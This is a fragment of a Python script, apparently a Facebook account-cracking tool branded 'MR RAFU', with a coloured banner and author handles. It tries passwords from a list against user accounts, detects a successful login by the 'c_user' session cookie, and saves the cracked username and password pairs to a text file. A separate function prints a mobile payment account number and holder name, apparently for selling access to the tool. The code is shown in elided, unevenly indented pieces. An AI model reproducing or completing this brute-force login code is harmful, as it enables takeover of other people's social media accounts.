...
logo =                                          """   
   \033[1;37m  ___ ___  ____           ____    ____  _____  __ __  
   \033[1;37m |   |   ||    \         |    \  /    ||     ||  |  |
   \033[1;37m| _   _ ||  D  )        |  D  )|  o  ||   __||  |  |
   \033[1;37m |  \_/  ||    /         |    / |     ||  |_  |  |  |  
   \033[1;37m |   |   ||    \  __     |    \ |  _  ||   _] |  :  |  
   \033[1;37m|   |   ||  .  \|  |    |  .  \|  |  ||  |   |     | 
   \033[1;37m|___|___||__|\_||__|    |__|\_||__|__||__|    \__,_   
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m               BROKEN😊💔
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m           M R RAFU 
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Rafu0878
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back MR RAFU❤️ Menu ")
	    sarfraz()
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [BROKEN💔-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('BROKEN💔_CP.txt' , 'a').write('%s\n' % wrt)
                        break
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\rjazzcash Account Number +8801982876336\n')
        print('\rAccount Name Md Sabbir Hossain Rafi \n')
        print
        print
